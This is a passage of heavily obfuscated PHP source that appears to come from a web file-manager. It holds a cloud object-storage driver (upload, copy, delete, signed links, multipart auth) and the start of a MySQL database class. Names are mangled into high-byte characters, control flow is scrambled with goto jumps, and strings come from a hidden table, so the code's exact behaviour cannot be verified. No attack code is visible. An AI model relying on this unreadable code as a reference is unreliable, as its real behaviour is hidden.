$this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto f†Øîç¼’‚; Fæâ‰‹¼İ: if ($F¾£ØõÙê[$cˆ¡…‚ù¶Ï[172]] != $cˆ¡…‚ù¶Ï[173] || $F¾£ØõÙê[$cˆ¡…‚ù¶Ï[174]] != $cˆ¡…‚ù¶Ï[173]) { return !1; } $cÒ—˜´’Æ = array_map($cˆ¡…‚ù¶Ï[175], $F¾£ØõÙê[$cˆ¡…‚ù¶Ï[176]]); if (!is_array($cÒ—˜´’Æ)) { $cÒ—˜´’Æ = array(); } goto FÃÈ¦—ĞÁ¸; FÃÈ¦—ĞÁ¸: $c»†â¶ÚåÆ = array($cˆ¡…‚ù¶Ï[177], $cˆ¡…‚ù¶Ï[178], $cˆ¡…‚ù¶Ï[179], $cˆ¡…‚ù¶Ï[180], $cˆ¡…‚ù¶Ï[181]); $AË×·ªèâğ = array_diff($c»†â¶ÚåÆ, $cÒ—˜´’Æ); return empty($AË×·ªèâğ); goto EÒÙ¡´‚ó¸; f†Øîç¼’‚: $cˆ¡…‚ù¶Ï =& $_SERVER[‘®…¢À]; $F¾£ØõÙê = $this->getBucketCors(); if (!$F¾£ØõÙê || !is_array($F¾£ØõÙê)) { return !1; } goto Fæâ‰‹¼İ; EÒÙ¡´‚ó¸: } public function mkfile($C¯‘¿…Öö¾, $A—º‘øÇ¦ò = '', $f•’¨¢Ğƒö = REPEAT_RENAME) { $BÏ³”¶÷¿ë = $this->setContent($C¯‘¿…Öö¾, $A—º‘øÇ¦ò); if ($BÏ³”¶÷¿ë !== !1) { return $this->getPathOuter($C¯‘¿…Öö¾); } return !1; } public function mkdir($CÈ‘Œñ©ö¨, $A¬‹òŞç¤â = REPEAT_SKIP) { if (empty($CÈ‘Œñ©ö¨)) { return !1; } if ($this->_isFolder($CÈ‘Œñ©ö¨)) { return $this->getPathOuter($CÈ‘Œñ©ö¨); } $Fè´–†›Œ¼ = $this->setContent($CÈ‘Œñ©ö¨, $_SERVER[‘®…¢À][33], !0); if ($Fè´–†›Œ¼ !== !1) { return $this->getPathOuter($CÈ‘Œñ©ö¨); } return !1; } public function copyFile($B¼ä‘äñÊ, $fçÍùÙ¢¨’, $E³Ğóèí‡ã = array()) { $b°´ÑÆŸ‚ö =& $_SERVER[‘®…¢À]; $C¾‡äÎôó = $this->objectMeta($B¼ä‘äñÊ); if (!$C¾‡äÎôó) { return !1; } if ($C¾‡äÎôó[$b°´ÑÆŸ‚ö[78]] <= 1024 * 1024 * 200) { $dŠÑòÄ´ô = $this->client->copyObject($this->bucket, $B¼ä‘äñÊ, $this->bucket, $fçÍùÙ¢¨’, $b°´ÑÆŸ‚ö[182], $E³Ğóèí‡ã); } else { $dŠÑòÄ´ô = $this->client->multiCopyObject($this->bucket, $B¼ä‘äñÊ, $this->bucket, $fçÍùÙ¢¨’, $E³Ğóèí‡ã); } $dŠÑòÄ´ô = $dŠÑòÄ´ô ? $this->getPathOuter($fçÍùÙ¢¨’) : !1; return $dŠÑòÄ´ô; } public function moveFile($A¨ÚŸèãí÷, $dŸ‡¡™™ìæ) { if ($this->copyFile($A¨ÚŸèãí÷, $dŸ‡¡™™ìæ)) { $this->delFile($A¨ÚŸèãí÷); return $this->getPathOuter($dŸ‡¡™™ìæ); } return !1; } public function delFile($díó„’Â¿) { return $this->client->deleteObject($this->bucket, $díó„’Â¿); } public function delFolder($A…Õ±¼ïÎ) { goto E†Õ»†õŸÉ; E†Õ»†õŸÉ: $bŠªÑ½çÜÂ =& $_SERVER[‘®…¢À]; $d°ÂÀ¥¯Ô = $this->listObjs($A…Õ±¼ïÎ); if (!$d°ÂÀ¥¯Ô) { $A…Õ±¼ïÎ = trim($A…Õ±¼ïÎ, $bŠªÑ½çÜÂ[8]); if (!empty($A…Õ±¼ïÎ)) { $A…Õ±¼ïÎ .= $bŠªÑ½çÜÂ[8]; } return $this->delFile($A…Õ±¼ïÎ); } goto C¿ÌÎâÁÒ¨; C¿ÌÎâÁÒ¨: $fªÀèùÕĞ = $e§‘×¦É·Ê = 0; $cÛ¾ãÀŠÄƒ = array_chunk(array_keys($d°ÂÀ¥¯Ô), 1000); foreach ($cÛ¾ãÀŠÄƒ as $Dó‚é¿Á«) { $fªÀèùÕĞ++; $e§‘×¦É·Ê += (int) $this->client->deleteObjects($this->bucket, $Dó‚é¿Á«); } goto B§”ì°ÀËé; B§”ì°ÀËé: return $fªÀèùÕĞ === $e§‘×¦É·Ê ? !0 : !1; goto eµ©ºìùŒ¿; eµ©ºìùŒ¿: } public function rename($A½Ç’£­ì, $cÏÂõ»åğ±) { return $this->renameObject($A½Ç’£­ì, $cÏÂõ»åğ±); } public function listPath($f…Ê™ÁáœŒ, $F“º™‹Àåó = false) { $eéËùÍæ‘ =& $_SERVER[‘®…¢À]; $c«êÊ¢™¹ = $this->listObjs($f…Ê™ÁáœŒ, null, null, $eéËùÍæ‘[8]); $DÌ×‡Šãñç = array($eéËùÍæ‘[75] => array(), $eéËùÍæ‘[74] => array()); foreach ($c«êÊ¢™¹ as $B£´ÒÓÖµí => $F‰Á¤éÀš²) { if ($B£´ÒÓÖµí == $eéËùÍæ‘[8]) { continue; } if (isset($F‰Á¤éÀš²[$eéËùÍæ‘[183]])) { $DÌ×‡Šãñç[$eéËùÍæ‘[75]][] = $this->folderInfo($F‰Á¤éÀš²[$eéËùÍæ‘[183]], $F“º™‹Àåó); } else { if (substr($F‰Á¤éÀš²[$eéËùÍæ‘[28]], -1) == $eéËùÍæ‘[8]) { continue; } $DÌ×‡Šãñç[$eéËùÍæ‘[74]][] = $this->fileInfo($F‰Á¤éÀš²[$eéËùÍæ‘[28]], $F“º™‹Àåó, $F‰Á¤éÀš²); } } return $DÌ×‡Šãñç; } private function fileInfo($F¼ùÑ…â…¾, $F£Š¯¬šî = false, $f¾ åÑ› = array()) { goto cî—à¹˜îº; cî—à¹˜îº: $d§…©¬‹‰Ê =& $_SERVER[‘®…¢À]; if ($F£Š¯¬šî) { return array($d§…©¬‹‰Ê[28] => $this->pathThis($F¼ùÑ…â…¾), $d§…©¬‹‰Ê[76] => $this->getPathOuter($F¼ùÑ…â…¾), $d§…©¬‹‰Ê[29] => $d§…©¬‹‰Ê[164], $d§…©¬‹‰Ê[157] => $this->ext($F¼ùÑ…â…¾), $d§…©¬‹‰Ê[78] => isset($f¾ åÑ›[$d§…©¬‹‰Ê[78]]) ? $f¾ åÑ›[$d§…©¬‹‰Ê[78]] : 0, $d§…©¬‹‰Ê[184] => 0, $d§…©¬‹‰Ê[108] => 0, $d§…©¬‹‰Ê[185] => !0, $d§…©¬‹‰Ê[186] => !0); } $aìÅ¼ŒŠ¹º = array($d§…©¬‹‰Ê[28] => $this->pathThis($F¼ùÑ…â…¾), $d§…©¬‹‰Ê[76] => $this->getPathOuter($F¼ùÑ…â…¾), $d§…©¬‹‰Ê[29] => $d§…©¬‹‰Ê[164], $d§…©¬‹‰Ê[184] => 0, $d§…©¬‹‰Ê[108] => 0, $d§…©¬‹‰Ê[78] => 0, $d§…©¬‹‰Ê[157] => $this->ext($F¼ùÑ…â…¾), $d§…©¬‹‰Ê[185] => !0, $d§…©¬‹‰Ê[186] => !0); goto dÅÌç³ÀŠ’; dÅÌç³ÀŠ’: if (empty($f¾ åÑ›)) { $f¾ åÑ› = $this->objectMeta($F¼ùÑ…â…¾); if (!$f¾ åÑ›) { return $aìÅ¼ŒŠ¹º; } } if (isset($f¾ åÑ›[$d§…©¬‹‰Ê[187]])) { $aìÅ¼ŒŠ¹º[$d§…©¬‹‰Ê[108]] = $f¾ åÑ›[$d§…©¬‹‰Ê[187]]; } if (isset($f¾ åÑ›[$d§…©¬‹‰Ê[78]])) { $aìÅ¼ŒŠ¹º[$d§…©¬‹‰Ê[78]] = $f¾ åÑ›[$d§…©¬‹‰Ê[78]]; } goto D¸¡øŒ¬Úø; D¸¡øŒ¬Úø: return $aìÅ¼ŒŠ¹º; goto dÃÃÌ¢®; dÃÃÌ¢®: } private function folderInfo($CĞ­¤Æç¦¡, $B²îÇÛ¥ƒ¢ = false) { goto FÄ½¸—½; FÄ½¸—½: $f…î…§ÂÉĞ =& $_SERVER[‘®…¢À]; if ($B²îÇÛ¥ƒ¢) { return array($f…î…§ÂÉĞ[28] => $this->pathThis($CĞ­¤Æç¦¡), $f…î…§ÂÉĞ[76] => $this->getPathOuter($f…î…§ÂÉĞ[8] . $CĞ­¤Æç¦¡), $f…î…§ÂÉĞ[29] => $f…î…§ÂÉĞ[77], $f…î…§ÂÉĞ[185] => !0, $f…î…§ÂÉĞ[186] => !0); } $c¥°“îÄ­Ü = array($f…î…§ÂÉĞ[28] => $this->pathThis($CĞ­¤Æç¦¡), $f…î…§ÂÉĞ[76] => $this->getPathOuter($f…î…§ÂÉĞ[8] . $CĞ­¤Æç¦¡), $f…î…§ÂÉĞ[29] => $f…î…§ÂÉĞ[77], $f…î…§ÂÉĞ[184] => 0, $f…î…§ÂÉĞ[108] => 0, $f…î…§ÂÉĞ[185] => !0, $f…î…§ÂÉĞ[186] => !0); goto EÈÑô×©êî; A˜òò¾•å§: if (!$c Ìïõ‰ß¥) { return $c¥°“îÄ­Ü; } if (isset($F„‚—Şšä‹[$f…î…§ÂÉĞ[187]])) { $c¥°“îÄ­Ü[$f…î…§ÂÉĞ[184]] = $F„‚—Şšä‹[$f…î…§ÂÉĞ[187]]; } return $c¥°“îÄ­Ü; goto Aïæ˜Ä‹ğå; EÈÑô×©êî: if ($CĞ­¤Æç¦¡ == $f…î…§ÂÉĞ[33]) { return $c¥°“îÄ­Ü; } $CĞ­¤Æç¦¡ = trim($CĞ­¤Æç¦¡, $f…î…§ÂÉĞ[8]) . $f…î…§ÂÉĞ[8]; $c Ìïõ‰ß¥ = $this->objectMeta($CĞ­¤Æç¦¡); goto A˜òò¾•å§; Aïæ˜Ä‹ğå: } public function listObjs($Dõ¦„õåô, $aÏÅè¿à² = null, $DŒ»ãØâ½ = null, $fÂØ‰õå· = null) { $a³İâƒÍÌ =& $_SERVER[‘®…¢À]; $Dõ¦„õåô = trim($Dõ¦„õåô, $a³İâƒÍÌ[8]); $C‘›ø®è‘¿ = empty($Dõ¦„õåô) ? $a³İâƒÍÌ[33] : $Dõ¦„õåô . $a³İâƒÍÌ[8]; return $this->client->getBucket($this->bucket, $C‘›ø®è‘¿, $aÏÅè¿à², $DŒ»ãØâ½, $fÂØ‰õå·, !0); } public function has($dÒªƒ¨ÑÇ, $bÕ„ãëîĞ° = false, $FÇ÷…“¯Å = true) { goto e¹õ°Ï²ì¢; e¹õ°Ï²ì¢: $BµË”…”Åµ =& $_SERVER[‘®…¢À]; $EÒğ¨Ò¹ÄĞ = 0; $cõ‡¡¨£Ñ» = 0; goto c˜Á³æä‹»; B¤ÀÜœ±¯Í: if ($bÕ„ãëîĞ°) { return array($BµË”…”Åµ[188] => $EÒğ¨Ò¹ÄĞ, $BµË”…”Åµ[189] => $cõ‡¡¨£Ñ»); } return !1; goto BõÃÃ­ò’; c˜Á³æä‹»: $e±–¡µÔ˜¥ = $this->listObjs($dÒªƒ¨ÑÇ, null, null, $BµË”…”Åµ[8]); $e±–¡µÔ˜¥ = is_array($e±–¡µÔ˜¥) ? $e±–¡µÔ˜¥ : array(); foreach ($e±–¡µÔ˜¥ as $Aª²œ¡…ŸÔ) { if (isset($Aª²œ¡…ŸÔ[$BµË”…”Åµ[28]]) && substr($Aª²œ¡…ŸÔ[$BµË”…”Åµ[28]], -1) != $BµË”…”Åµ[8]) { if (!$bÕ„ãëîĞ° && $FÇ÷…“¯Å) { return !0; } $EÒğ¨Ò¹ÄĞ++; } else { if (isset($Aª²œ¡…ŸÔ[$BµË”…”Åµ[183]])) { if (!$bÕ„ãëîĞ° && !$FÇ÷…“¯Å) { return !1; } $cõ‡¡¨£Ñ»++; } } } goto B¤ÀÜœ±¯Í; BõÃÃ­ò’: } public function listAll($d´Œ¾ öÂ) { $FÈ—ã…¥ä½ =& $_SERVER[‘®…¢À]; $b½•öÆöÇ = $this->listObjs($d´Œ¾ öÂ); $dÛ‘„†ÇŒ© = $a›Üù–÷š = array(); foreach ($b½•öÆöÇ as $a†¼Ç‹á› => $bÒä¦øÔ™æ) { $dÛ‘„†ÇŒ©[] = $bÒä¦øÔ™æ[$FÈ—ã…¥ä½[28]]; $a›Üù–÷š[$a†¼Ç‹á›] = $bÒä¦øÔ™æ[$FÈ—ã…¥ä½[78]]; } return $this->listAllFiles($d´Œ¾ öÂ, $dÛ‘„†ÇŒ©, $a›Üù–÷š); } public function canRead($aèæ•²æ‡) { $fÕ‚¿ªˆ· =& $_SERVER[‘®…¢À]; $d°†°øò†Š = $this->client->getAccessControlPolicy($this->bucket, $aèæ•²æ‡); if (!$d°†°øò†Š) { return !1; } return in_array($d°†°øò†Š, array($fÕ‚¿ªˆ·[190], $fÕ‚¿ªˆ·[191], $fÕ‚¿ªˆ·[192])) ? !0 : !1; } public function canWrite($càÒ¶é²†«) { $c¤ˆöŞäƒñ =& $_SERVER[‘®…¢À]; $eÌÁÏÆ¸‘ = $this->client->getAccessControlPolicy($this->bucket, $càÒ¶é²†«); if (!$eÌÁÏÆ¸‘) { return !1; } return in_array($eÌÁÏÆ¸‘, array($c¤ˆöŞäƒñ[190], $c¤ˆöŞäƒñ[191])) ? !0 : !1; } public function getContent($C‰†æª¼) { return $this->client->getObject($this->bucket, $C‰†æª¼); } public function setContent($DªŸöİÁñø, $F£ß´Ì•§ = '', $B¼¦¶‡ÄÌ = false) { goto DÜ£ÀŒ›¹; B³ÆïÚÈõ: $BÀ™Ù–®¨¹ = $this->client->putObject($F£ß´Ì•§, $this->bucket, $DªŸöİÁñø, $E†âµ­“[182], array(), $d‘èÉÂËì); if (!$BÀ™Ù–®¨¹) { return !1; } if ($B¼¦¶‡ÄÌ) { return !0; } goto c¢§çˆÀê; DÜ£ÀŒ›¹: $E†âµ­“ =& $_SERVER[‘®…¢À]; $DªŸöİÁñø = $B¼¦¶‡ÄÌ ? trim($DªŸöİÁñø, $E†âµ­“[8]) . $E†âµ­“[8] : $DªŸöİÁñø; $d‘èÉÂËì = get_file_mime(get_path_ext($DªŸöİÁñø)); goto B³ÆïÚÈõ; c¢§çˆÀê: $BÀ™Ù–®¨¹ = $this->copyFile($DªŸöİÁñø, $DªŸöİÁñø, array($E†âµ­“[193] => $BÀ™Ù–®¨¹[$E†âµ­“[194]])); return $BÀ™Ù–®¨¹ ? !0 : !1; goto F»¶–Åöá; F»¶–Åöá: } public function fileSubstr($B•æ´ìâ¬š, $CÖ‘†©¼¶³, $d‹Ñ ‰ŒØÎ) { $dõìíˆ¢£ = $CÖ‘†©¼¶³ + $d‹Ñ ‰ŒØÎ - 1; return $this->client->getObject($this->bucket, $B•æ´ìâ¬š, array($_SERVER[‘®…¢À][195] => "\142\x79\164\x65\163\x3d{$CÖ‘†©¼¶³}\x2d{$dõìíˆ¢£}")); } public function upload($BÉ³“ŞÑ¹…, $có‚†ö§™³, $d´´ØãµŠ£ = false, $föé†Ç‰½î = REPEAT_REPLACE) { $c‡Ñ² ¬Ò =& $_SERVER[‘®…¢À]; $C°¥†âİİÃ = array($c‡Ñ² ¬Ò[193] => @md5_file($có‚†ö§™³)); $c…ƒóê‹Ä“ = array($c‡Ñ² ¬Ò[196] => get_file_mime(get_path_ext($BÉ³“ŞÑ¹…))); if (IO::size($có‚†ö§™³) <= 1024 * 1024 * 200) { $aˆİóõ“‡™ = $this->client->putObjectFile($có‚†ö§™³, $this->bucket, $BÉ³“ŞÑ¹…, $c‡Ñ² ¬Ò[182], $C°¥†âİİÃ, $c…ƒóê‹Ä“); return !empty($aˆİóõ“‡™) ? $this->getPathOuter($BÉ³“ŞÑ¹…) : !1; } $bÓÚæô—ãš = $this->client->multiUploadObject($có‚†ö§™³, $this->bucket, trim($BÉ³“ŞÑ¹…, $c‡Ñ² ¬Ò[8]), $C°¥†âİİÃ, $c…ƒóê‹Ä“); return $bÓÚæô—ãš ? $this->getPathOuter($BÉ³“ŞÑ¹…) : !1; } public function download($CÈî¤¶†ÄÔ, $d˜ï™ØùÏÈ) { if (!@is_dir($this->pathFather($d˜ï™ØùÏÈ)) && !IO::mkdir($this->pathFather($d˜ï™ØùÏÈ))) { return !1; } $eå‹½ÊÖ¬ = $this->client->getObject($this->bucket, $CÈî¤¶†ÄÔ, array(), $d˜ï™ØùÏÈ); return $eå‹½ÊÖ¬ !== !1 ? $d˜ï™ØùÏÈ : !1; } public function link($a¨ÆÃğ±, $CöÍ˜–ôôÈ = array()) { $A‰ÜŠ•™Öß =& $_SERVER[‘®…¢À]; if ($this->signVer == $A‰ÜŠ•™Öß[197]) { return $this->client->getAuthenticatedURL($this->bucket, $a¨ÆÃğ±, 3600 * 12, $CöÍ˜–ôôÈ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($a¨ÆÃğ±, $A‰ÜŠ•™Öß[8]), 3600 * 12, $this->region, array(), !0, $CöÍ˜–ôôÈ); } public function fileOut($a‚šßƒéèï, $B¥µÑÚ£Ç× = false, $f÷²ÖÏó¡ = false, $b‚»ãä¸…á = '') { goto dØ¸Â¸¿‰à; e­Ø‹¦Ê¡—: if ($föñ£—´ò == $e—œ™íØ©›[198]) { return parent::fileOut($a‚šßƒéèï, $B¥µÑÚ£Ç×, $f÷²ÖÏó¡, $b‚»ãä¸…á); } $B¥µÑÚ£Ç× = $B¥µÑÚ£Ç× ? $e—œ™íØ©›[199] : $e—œ™íØ©›[200]; $e…äòà„”¨ = array($e—œ™íØ©›[201] => $B¥µÑÚ£Ç× . $e—œ™íØ©›[202] . rawurlencode($f÷²ÖÏó¡), $e—œ™íØ©›[203] => $föñ£—´ò); goto AßÂêÇÍ‹Û; AßÂêÇÍ‹Û: $fÖæÉ¢ÖŒó = $this->link($a‚šßƒéèï, $e…äòà„”¨); $this->fileOutLink($fÖæÉ¢ÖŒó); goto f´îÒõ¡ñ‘; dØ¸Â¸¿‰à: $e—œ™íØ©› =& $_SERVER[‘®…¢À]; if (!$f÷²ÖÏó¡) { $f÷²ÖÏó¡ = $this->pathThis($a‚šßƒéèï); } $föñ£—´ò = get_file_mime(get_path_ext($f÷²ÖÏó¡)); goto e­Ø‹¦Ê¡—; f´îÒõ¡ñ‘: } public function fileOutServer($eË—‹õ£ˆ, $fˆ‹³Á®†‡ = false, $dÂÈò­ÖÛ® = false, $BÚÕ°µ™™¼ = '') { parent::fileOut($eË—‹õ£ˆ, $fˆ‹³Á®†‡, $dÂÈò­ÖÛ®, $BÚÕ°µ™™¼); } public function fileOutImage($C®ª†ƒÈÆÌ, $b ø¡åŠÓè = 250) { $bœ¸Šè« = $this->link($C®ª†ƒÈÆÌ); $this->fileOutLink($bœ¸Šè«); } public function fileOutImageServer($Eõ¾ãğÆ™, $dë ›’– = 250) { parent::fileOutImage($Eõ¾ãğÆ™, $dë ›’–); } public function hashMd5($eòá¦–®‚, $cÒÂ”éóë– = '') { $D’âöµ•æ® =& $_SERVER[‘®…¢À]; $f°—å¾ = $this->objectMeta($eòá¦–®‚); if (!$f°—å¾) { return !1; } $cÒÂ”éóë– = $cÒÂ”éóë– ? $cÒÂ”éóë– : _get($f°—å¾, $D’âöµ•æ®[204]); $cÒÂ”éóë– = $cÒÂ”éóë– ? $cÒÂ”éóë– : _get($f°—å¾, $D’âöµ•æ®[194], $D’âöµ•æ®[33]); return $cÒÂ”éóë–; } public function uploadFormData($fÔ—»—˜», $fñá³šÅà = 3600) { $c–õ®²ÆÛ£ =& $_SERVER[‘®…¢À]; $b¤àã·¬âà = $this->pathFather($fÔ—»—˜»); $B¤¿ƒé„Ğï = $this->client->getHttpUploadPostParams($this->bucket, $b¤àã·¬âà, $c–õ®²ÆÛ£[182], $fñá³šÅà); return array_merge((array) $B¤¿ƒé„Ğï, array($c–õ®²ÆÛ£[166] => $this->getHost())); } public function multiUploadFormData($C£Ù”Ÿ²Ç“, $Bø®ïÄîĞŒ = 3600) { $côç«´æ =& $_SERVER[‘®…¢À]; $D®İéİìƒ‹ = gmdate($côç«´æ[205]); $B†¡¤ñí© = array(); $f¿Ú¿–”ÊÑ = $this->client->getUploadId($this->bucket, $C£Ù”Ÿ²Ç“, $B†¡¤ñí©); if (!$f¿Ú¿–”ÊÑ) { return !1; } return array($côç«´æ[206] => $f¿Ú¿–”ÊÑ, $côç«´æ[166] => $this->getHost() . $côç«´æ[8] . $this->pathEncode($C£Ù”Ÿ²Ç“), $côç«´æ[207] => $D®İéİìƒ‹, $côç«´æ[90] => $C£Ù”Ÿ²Ç“); } public function multiUploadAuthData($Fòª‹æÒÀ, $FÅøÖ©—İ = array()) { goto dá£‹Øõ; Fìß´ğ“°: $E†×ÍŠ¯Ò¢ = implode($C¿èó—â—Ú[214], $D¸Ì•É¡Ó); $D¦¡Ë¸ˆã‘ = base64_encode(hash_hmac($C¿èó—â—Ú[215], $E†×ÍŠ¯Ò¢, $this->secret, !0)); $e‘¼»ğø˜ = $C¿èó—â—Ú[216] . $this->accessKey . $C¿èó—â—Ú[4] . $D¦¡Ë¸ˆã‘; goto fì×†£Ü‘ƒ; dá£‹Øõ: $C¿èó—â—Ú =& $_SERVER[‘®…¢À]; $A”µÛ§‰Áó = isset($FÅøÖ©—İ[$C¿èó—â—Ú[207]]) ? $FÅøÖ©—İ[$C¿èó—â—Ú[207]] : gmdate($C¿èó—â—Ú[205]); $c§ªİÅÄã = isset($FÅøÖ©—İ[$C¿èó—â—Ú[157]]) ? $FÅøÖ©—İ[$C¿èó—â—Ú[157]] : $C¿èó—â—Ú[33]; goto Dİ‰¸³áÂ´; Dİ‰¸³áÂ´: $A›‹«Ü Úñ = $FÅøÖ©—İ[$C¿èó—â—Ú[90]]; unset($FÅøÖ©—İ[$C¿èó—â—Ú[90]]); if (isset($FÅøÖ©—İ[$C¿èó—â—Ú[208]])) { $FÅøÖ©—İ[$C¿èó—â—Ú[207]] = $A”µÛ§‰Áó; return $this->listUploadParts($A›‹«Ü Úñ, $FÅøÖ©—İ); } goto f‡£òÂ…¿±; fì×†£Ü‘ƒ: if (strpos($c§ªİÅÄã, $C¿èó—â—Ú[210]) === 0) { return array($C¿èó—â—Ú[217] => $e‘¼»ğø˜, $C¿èó—â—Ú[207] => $A”µÛ§‰Áó); } return $e‘¼»ğø˜; goto E¡èêÍ¤˜; f‡£òÂ…¿±: $D¸Ì•É¡Ó = array($C¿èó—â—Ú[209], $C¿èó—â—Ú[33], $C¿èó—â—Ú[117], $C¿èó—â—Ú[33], "\x78\x2d\x61\155\172\55\144\141\x74\145\72{$A”µÛ§‰Áó}", $C¿èó—â—Ú[8] . $this->bucket . $C¿èó—â—Ú[8] . $this->pathEncode($A›‹«Ü Úñ) . $c§ªİÅÄã); if (strpos($c§ªİÅÄã, $C¿èó—â—Ú[210]) === 0) { $D¸Ì•É¡Ó[0] = $C¿èó—â—Ú[211]; } if (isset($FÅøÖ©—İ[$C¿èó—â—Ú[212]]) && $FÅøÖ©—İ[$C¿èó—â—Ú[212]] == $C¿èó—â—Ú[213]) { $D¸Ì•É¡Ó[0] = $C¿èó—â—Ú[213]; } goto Fìß´ğ“°; E¡èêÍ¤˜: } public function listUploadParts($B˜ˆ½ÛŸ, $fîŞ“Ã”‚¥ = array()) { goto EÀ­¡Ãˆç; D¿´ÂïôÊŒ: $d—õñ­Ù£ = $this->multiUploadAuthData($B˜ˆ½ÛŸ, $fîŞ“Ã”‚¥); if (empty($d—õñ­Ù£)) { return !1; } return array($c¯ôš‘[217] => $d—õñ­Ù£, $c¯ôš‘[207] => $fîŞ“Ã”‚¥[$c¯ôš‘[207]], $c¯ôš‘[219] => $F°¹õ„ÄÏä); goto fÂöŸ¨½; C•¿Šê¬°ƒ: if (!$F°¹õ„ÄÏä) { return !1; } unset($fîŞ“Ã”‚¥[$c¯ôš‘[208]], $fîŞ“Ã”‚¥[$c¯ôš‘[212]]); $fîŞ“Ã”‚¥[$c¯ôš‘[90]] = $B˜ˆ½ÛŸ; goto D¿´ÂïôÊŒ; EÀ­¡Ãˆç: $c¯ôš‘ =& $_SERVER[‘®…¢À]; $CïôƒÒ»Ğ = str_replace($c¯ôš‘[218], $c¯ôš‘[33], $fîŞ“Ã”‚¥[$c¯ôš‘[157]]); $F°¹õ„ÄÏä = $this->client->listParts($this->bucket, $B˜ˆ½ÛŸ, $CïôƒÒ»Ğ); goto C•¿Šê¬°ƒ; fÂöŸ¨½: } public function getHost() { return parent::getHost() . $_SERVER[‘®…¢À][8] . $this->bucket; } public function size($B›ù‹ĞÏƒº) { $E†ÄÒ¼òš· = $this->objectMeta($B›ù‹ĞÏƒº); return $E†ÄÒ¼òš· ? $E†ÄÒ¼òš·[$_SERVER[‘®…¢À][78]] : 0; } public function info($A´Õö…º£ğ) { if ($this->isFolder($A´Õö…º£ğ)) { return $this->folderInfo($A´Õö…º£ğ); } else { if ($this->isFile($A´Õö…º£ğ)) { return $this->fileInfo($A´Õö…º£ğ); } } return !1; } public function exist($eˆÁ³ã”’È) { return $this->isFile($eˆÁ³ã”’È) || $this->isFolder($eˆÁ³ã”’È); } public function isFile($FÕ¬é«Âµ…) { return !$this->isFolder($FÕ¬é«Âµ…) && $this->objectMeta($FÕ¬é«Âµ…); } public function isFolder($F†‰„ÅËÃ ) { return $this->cacheMethod($_SERVER[‘®…¢À][220], $F†‰„ÅËÃ ); } protected function objectMeta($Cİ·é‰ÄŒ§) { return $this->cacheMethod($_SERVER[‘®…¢À][221], $Cİ·é‰ÄŒ§); } protected function _objectMeta($A„±¬ğ´éí) { $BÕ³æ¸İ =& $_SERVER[‘®…¢À]; $A„±¬ğ´éí = rtrim($A„±¬ğ´éí, $BÕ³æ¸İ[8]); try { $Eõ×ì—‹Üò = $this->client->getObjectInfo($this->bucket, $A„±¬ğ´éí); if (!isset($Eõ×ì—‹Üò[$BÕ³æ¸İ[204]]) && isset($Eõ×ì—‹Üò[$BÕ³æ¸İ[222]])) { $Eõ×ì—‹Üò[$BÕ³æ¸İ[204]] = $Eõ×ì—‹Üò[$BÕ³æ¸İ[222]]; } } catch (OSS\Core\OssException $cİŞàİçô) { $Eõ×ì—‹Üò = !1; } if (!$Eõ×ì—‹Üò) { } return $Eõ×ì—‹Üò; } protected function _isFolder($EíÉ­ÚÈ¾¼) { goto aÖÉäÖŒ´; aÖÉäÖŒ´: $A¥Ê¨ÃÅ¢Ó =& $_SERVER[‘®…¢À]; $EíÉ­ÚÈ¾¼ = rtrim($EíÉ­ÚÈ¾¼, $A¥Ê¨ÃÅ¢Ó[8]); if ($EíÉ­ÚÈ¾¼ == $A¥Ê¨ÃÅ¢Ó[33] || $EíÉ­ÚÈ¾¼ == $A¥Ê¨ÃÅ¢Ó[8]) { return !0; } goto dÉÇ—°Ğ”º; dÉÇ—°Ğ”º: $FéÏ·Öì… = $this->client->getBucket($this->bucket, $EíÉ­ÚÈ¾¼, null, 1); if (empty($FéÏ·Öì…)) { return !1; } $FéÏ·Öì… = array_values($FéÏ·Öì…); goto AĞ—¾×Ó´; AĞ—¾×Ó´: if (substr($FéÏ·Öì…[0][$A¥Ê¨ÃÅ¢Ó[28]], -1) == $A¥Ê¨ÃÅ¢Ó[8]) { return !0; } if (get_path_this($FéÏ·Öì…[0][$A¥Ê¨ÃÅ¢Ó[28]]) == get_path_this($EíÉ­ÚÈ¾¼)) { return !1; } return !0; goto A·åÕêÇ‰; A·åÕêÇ‰: } } define($_SERVER[‘®…¢À][223], 1); goto BÏ–Ê¹ù…§; EƒôÂç»‡í: class DbMysql extends Db { public function __construct($Aš©ğÖ´ = '') { $cö¡»äÌ =& $_SERVER[‘®…¢À]; if (!extension_loaded($cö¡»äÌ[689])) { think_exception(think_lang($cö¡»äÌ[10]) . $cö¡»äÌ[778]); } if (!empty($Aš©ğÖ´)) { $this->config = $Aš©ğÖ´; if (empty($this->config[$cö¡»äÌ[13]])) { $this->config[$cö¡»äÌ[13]] = $cö¡»äÌ[33]; } } } public function connect($Bù†®ğà = '', $EÀÕŸÒºÚ = 0, $cĞ¯ÛíˆÂ = false) { $d¬¸‹½ò’ =& $_SERVER[‘®…¢À]; if (!isset($this->linkID[$EÀÕŸÒºÚ])) { goto C™Ş¸™™¶; eôšåĞõåõ: if ($FæÕ•ÏğĞ) { $this->linkID[$EÀÕŸÒºÚ] = mysql_pconnect($AóÁäâˆŠ…, $Bù†®ğà[$d¬¸‹½ò’[781]], $Bù†®ğà[$d¬¸‹½ò’[782]], 131072); } else { $this->linkID[$EÀÕŸÒºÚ] = mysql_connect($AóÁäâˆŠ…, $Bù†®ğà[$d¬¸‹½ò’[781]], $Bù†®ğà[$d¬¸‹½ò’[782]], !0, 131072); } if (!$this->linkID[$EÀÕŸÒºÚ] || !empty($Bù†®ğà[$d¬¸‹½ò’[17]]) && !mysql_select_db($Bù†®ğà[$d¬¸‹½ò’[17]], $this->linkID[$EÀÕŸÒºÚ])) { think_exception(mysql_error()); } $A·ŞÏè¶°– = mysql_get_server_info($this->linkID[$EÀÕŸÒºÚ]); goto fÈğ“ªË; C™Ş¸™™¶: if (empty($Bù†®ğà)) { $Bù†®ğà = $this->config; } $AóÁäâˆŠ… = $Bù†®ğà[$d¬¸‹½ò’[779]] . ($Bù†®ğà[$d¬¸‹½ò’[780]] ? "\x3a{$Bù†®ğà[$d¬¸‹½ò’[780]]}" : $d¬¸‹½ò’[33]); $FæÕ•ÏğĞ = !empty($Bù†®ğà[$d¬¸‹½ò’[13]][$d¬¸‹½ò’[14]]) ? $Bù†®ğà[$d¬¸‹½ò’[13]][$d¬¸‹½ò’[14]] : $this->pconnect; goto eôšåĞõåõ; fÈğ“ªË: mysql_query($d¬¸‹½ò’[783] . 